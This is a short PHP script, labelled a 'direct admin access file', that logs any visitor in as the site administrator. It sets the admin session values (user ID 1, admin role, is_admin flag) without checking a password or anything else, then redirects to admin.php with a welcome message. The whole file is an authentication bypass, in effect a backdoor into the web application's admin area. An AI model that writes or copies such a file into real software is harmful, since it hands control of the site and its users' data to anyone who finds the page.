<?php
// Direct admin access file
session_start();

// Set admin session variables
$_SESSION["user_id"] = 1; 
$_SESSION["username"] = "Administrator";
$_SESSION["email"] = "admin@gmail.com";
$_SESSION["avatar"] = "admin-avatar.png";
$_SESSION["role"] = "admin";
$_SESSION["is_admin"] = true;

// Generate CSRF token
$_SESSION["csrf_token"] = bin2hex(random_bytes(32));

// Success message
$_SESSION["flash_message"] = "Welcome back, Administrator!";
$_SESSION["flash_message_type"] = "success";

// Redirect to admin page
header("Location: admin.php");
exit;
?>
